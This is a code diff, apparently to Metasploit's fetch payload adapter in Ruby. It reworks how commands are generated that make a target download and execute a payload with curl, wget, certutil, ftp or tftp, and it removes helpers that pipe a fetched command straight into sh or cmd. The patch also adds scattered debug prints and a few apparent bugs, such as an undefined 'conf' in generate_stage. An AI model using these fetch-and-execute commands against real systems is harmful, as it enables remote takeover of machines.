@@ -1,5 +1,6 @@
 module Msf::Payload::Adapter::Fetch
   include Msf::Payload::Adapter::Fetch::Fileless
+  include Msf::Payload::Adapter::Fetch::Pipe
 
   # Initializes the fetch adapter state and registers datastore options used to
   # stage and serve the adapted payload.
@@ -24,9 +25,12 @@ module Msf::Payload::Adapter::Fetch
         Msf::OptBool.new('FetchHandlerDisable', [true, 'Disable fetch handler', false])
       ]
     )
+    deregister_options('REQUESTED_ARCH', 'FETCH_FILENAME')
     @fetch_service = nil
+    @multi_arch = nil
     @myresources = []
     @srvexe = ''
+    @srv_resources = []
     @pipe_uri = nil
     @pipe_cmd = nil
     @remote_destination_win = nil
@@ -76,8 +80,8 @@ module Msf::Payload::Adapter::Fetch
   # Returns the payload download URI served by the fetch listener.
   #
   # @return [String] The URI path and authority for the generated payload.
-  def download_uri
-    "#{srvnetloc}/#{srvuri}"
+  def download_uri(uri)
+    "#{srvnetloc}/#{uri}"
   end
 
   # Returns the pipe download URI used when serving commands over FETCH_PIPE.
@@ -100,7 +104,17 @@ module Msf::Payload::Adapter::Fetch
   def fetch_bindport
     datastore['FetchListenerBindPort'].blank? ? srvport : datastore['FetchListenerBindPort']
   end
-  
+
+  def add_srv_entry(uri, data, arch = ARCH_CMD)
+    vprint_status "#{__LINE__}"
+    srv_entry = {
+      :arch => arch,
+      :uri => uri,
+      :data => data
+    }
+    @srv_resources << srv_entry
+  end
+
   # Returns the authority string used by the fetch listener socket.
   #
   # @return [String] The host:port pair for the fetch listener.
@@ -124,64 +138,58 @@ module Msf::Payload::Adapter::Fetch
   # @param opts [Hash] Payload generation options.
   # @return [String] The fetch command to run on the target.
   def generate(opts = {})
+    vprint_status "#{__method__}"
+    vprint_status "#{__LINE__}"
     opts[:arch] ||= module_info['AdaptedArch']
-    opts[:code] = super
-    @srvexe = generate_payload_exe(opts)
+    @payload_opts = opts[:arch]
+    dynamic_arch = false
+    vprint_status "#{__LINE__}"
+    if opts[:arch] == ARCH_ANY && module_info['AdaptedPlatform'] == 'linux'
+      vprint_status "#{__LINE__}"
+      dynamic_arch = true
+      add_srv_entry(srvuri, 'x', opts)
+    else
+      vprint_status "#{__LINE__}"
+      dynamic_arch = false
+      add_srv_entry(srvuri, generate_payload_exe(opts), opts)
+    end
+
+    vprint_status "#{__LINE__}"
+    cmd = generate_fetch_commands(srvuri, dynamic_arch)
     if datastore['FETCH_PIPE']
+      vprint_status "#{__LINE__}"
       unless pipe_supported_binaries.include?(datastore['FETCH_COMMAND'].upcase)
         fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
       end
-      @pipe_cmd = generate_fetch_commands
-      @pipe_cmd << "\n" if windows? #need CR when we pipe command in Windows
-      vprint_status("Command served: #{@pipe_cmd}")
-      cmd = generate_pipe_command
-    else
-      cmd = generate_fetch_commands
+      cmd << '\n' if windows? # Needs CR for Windows command
+      add_srv_entry(pipe_srvuri, cmd)
+      cmd = generate_pipe_command(pipe_srvuri)
     end
-    vprint_status("Command to run on remote host: #{cmd}")
+    vprint_status "#{__LINE__}"
+    vprint_status("Command to execute on target: #{cmd}")
     cmd
-  end
-
-  # Builds the fetch command used to execute a payload directly from a pipe.
-  #
-  # @return [String] The pipe-based execution command.
-  def generate_pipe_command
-    # TODO: Make a check method that determines if we support a platform/server/command combination
-    @pipe_uri = pipe_srvuri
-
-    case datastore['FETCH_COMMAND'].upcase
-    when 'WGET'
-      return _generate_wget_pipe
-    when 'GET'
-      return _generate_get_pipe
-    when 'CURL'
-      return _generate_curl_pipe
-    else
-      fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
-    end
   end
 
   # Dispatches command generation to the selected FETCH_COMMAND helper.
   #
   # @return [String] The generated fetch-and-execute command.
-  def generate_fetch_commands
+  def generate_fetch_commands(uri, dynamic_arch)
     # TODO: Make a check method that determines if we support a platform/server/command combination
     #
+    vprint_status "#{__method__}"
     case datastore['FETCH_COMMAND'].upcase
     when 'FTP'
-      return _generate_ftp_command
+      return _generate_ftp_command(uri)
     when 'TNFTP'
-      return _generate_tnftp_command
+      return _generate_tnftp_command(uri)
     when 'WGET'
-      return _generate_wget_command
-    when 'GET'
-      return _generate_get_command
+      return _generate_wget_command(uri)
     when 'CURL'
-      return _generate_curl_command
+      return _generate_curl_command(uri, dynamic_arch)
     when 'TFTP'
-      return _generate_tftp_command
+      return _generate_tftp_command(uri)
     when 'CERTUTIL'
-      return _generate_certutil_command
+      return _generate_certutil_command(uri)
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
@@ -194,6 +202,7 @@ module Msf::Payload::Adapter::Fetch
   # @return [String] The generated stage contents.
   def generate_stage(opts = {})
     opts[:arch] ||= module_info['AdaptedArch']
+    conf[:arch] = @multi_arch unless @multi_arch.nil?
     super
   end
 
@@ -204,6 +213,7 @@ module Msf::Payload::Adapter::Fetch
   # @return [PayloadUUID] The generated payload UUID.
   def generate_payload_uuid(conf = {})
     conf[:arch] ||= module_info['AdaptedArch']
+    conf[:arch] = @multi_arch unless @multi_arch.nil?
     conf[:platform] ||= module_info['AdaptedPlatform']
     super
   end
@@ -376,10 +386,10 @@ module Msf::Payload::Adapter::Fetch
   # Builds a certutil-based command line for fetching the payload on Windows.
   #
   # @return [String] The certutil fetch-and-execute command.
-  def _generate_certutil_command
+  def _generate_certutil_command(uri)
     case fetch_protocol
     when 'HTTP'
-      get_file_cmd = "certutil -urlcache -f http://#{download_uri} #{_remote_destination}"
+      get_file_cmd = "certutil -urlcache -f http://#{download_uri(uri)} #{_remote_destination}"
     when 'HTTPS'
       # I don't think there is a way to disable cert check in certutil....
       print_error('CERTUTIL binary does not support insecure mode')
@@ -393,90 +403,53 @@ module Msf::Payload::Adapter::Fetch
   # Builds a curl-based command line for fetching the payload.
   #
   # @return [String] The curl fetch-and-execute command.
-  def _generate_curl_command
+  def _generate_curl_command(uri, dynamic_arch)
     case fetch_protocol
     when 'HTTP'
-      get_file_cmd = "curl -so #{_remote_destination} http://#{download_uri}"
+      get_file_cmd = "curl -so #{_remote_destination} http://#{download_uri(uri)}"
+      get_file_cmd << "?arch=$(uname -m)" if dynamic_arch
     when 'HTTPS'
-      get_file_cmd = "curl -sko #{_remote_destination} https://#{download_uri}"
+      get_file_cmd = "curl -sko #{_remote_destination} https://#{download_uri(uri)}"
     when 'TFTP'
-      get_file_cmd = "curl -so #{_remote_destination} tftp://#{download_uri}"
+      get_file_cmd = "curl -so #{_remote_destination} tftp://#{download_uri(uri)}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
     _execute_add(get_file_cmd)
   end
 
-  # Builds a curl command that streams a served command directly into a shell.
-  #
-  # @return [String] The curl pipe command.
-  def _generate_curl_pipe
-    execute_cmd = 'sh'
-    execute_cmd = 'cmd' if windows?
-    case fetch_protocol
-    when 'HTTP'
-      return "curl -s http://#{_download_pipe}|#{execute_cmd}"
-    when 'HTTPS'
-      return "curl -sk https://#{_download_pipe}|#{execute_cmd}"
-    else
-      fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
-    end
-  end
-
   # Builds a GET-based command line for fetching the payload.
   #
   # @return [String] The GET fetch-and-execute command.
-  def _generate_get_command
+  def _generate_get_command(uri)
     # Specifying the method (-m GET) is necessary on OSX
     case fetch_protocol
     when 'HTTP'
-      get_file_cmd = "GET -m GET http://#{download_uri}>#{_remote_destination}"
+      get_file_cmd = "GET -m GET http://#{download_uri(uri)}>#{_remote_destination}"
     when 'HTTPS'
       # There is no way to disable cert check in GET ...
       print_error('GET binary does not support insecure mode')
       fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using GET')
-      get_file_cmd = "GET -m GET https://#{download_uri}>#{_remote_destination}"
+      get_file_cmd = "GET -m GET https://#{download_uri(uri)}>#{_remote_destination}"
     when 'FTP'
-      get_file_cmd = "GET ftp://#{download_uri}>#{_remote_destination}"
+      get_file_cmd = "GET ftp://#{download_uri(uri)}>#{_remote_destination}"
     else
       fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
     end
     _execute_add(get_file_cmd)
   end
 
-  # Builds a GET command that streams a served command directly into a shell.
-  #
-  # @return [String] The GET pipe command.
-  def _generate_get_pipe
-    # Specifying the method (-m GET) is necessary on OSX
-    execute_cmd = 'sh'
-    execute_cmd = 'cmd' if windows?
-    case fetch_protocol
-    when 'HTTP'
-      return "GET -m GET http://#{_download_pipe}|#{execute_cmd}"
-    when 'HTTPS'
-      # There is no way to disable cert check in GET ...
-      print_error('GET binary does not support insecure mode')
-      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using GET')
-      return "GET -m GET https://#{_download_pipe}|#{execute_cmd}"
-    when 'FTP'
-      return "GET ftp://#{_download_pipe}|#{execute_cmd}"
-    else
-      fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
-    end
-  end
-
   # Builds an ftp command line for fetching the payload.
   #
   # @return [String] The ftp fetch-and-execute command.
-  def _generate_ftp_command
+  def _generate_ftp_command(uri)
     case fetch_protocol
     when 'FTP'
-      get_file_cmd = "ftp -Vo #{_remote_destination_nix} ftp://#{download_uri}"
+      get_file_cmd = "ftp -Vo #{_remote_destination_nix} ftp://#{download_uri(uri)}"
     when 'HTTP'
-      get_file_cmd = "ftp -Vo #{_remote_destination_nix} http://#{download_uri}"
+      get_file_cmd = "ftp -Vo #{_remote_destination_nix} http://#{download_uri(uri)}"
     when 'HTTPS'
-      get_file_cmd = "ftp -Vo #{_remote_destination_nix} https://#{download_uri}"
+      get_file_cmd = "ftp -Vo #{_remote_destination_nix} https://#{download_uri(uri)}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
@@ -536,22 +509,7 @@ module Msf::Payload::Adapter::Fetch
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-
     _execute_add(get_file_cmd)
-  end
-
-  # Builds a wget command that streams a served command directly into a shell.
-  #
-  # @return [String] The wget pipe command.
-  def _generate_wget_pipe
-    case fetch_protocol
-    when 'HTTPS'
-      return "wget --no-check-certificate -qO- https://#{_download_pipe}|sh"
-    when 'HTTP'
-      return "wget -qO- http://#{_download_pipe}|sh"
-    else
-      fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
-    end
   end
 
   # Returns the platform-appropriate destination path used by download
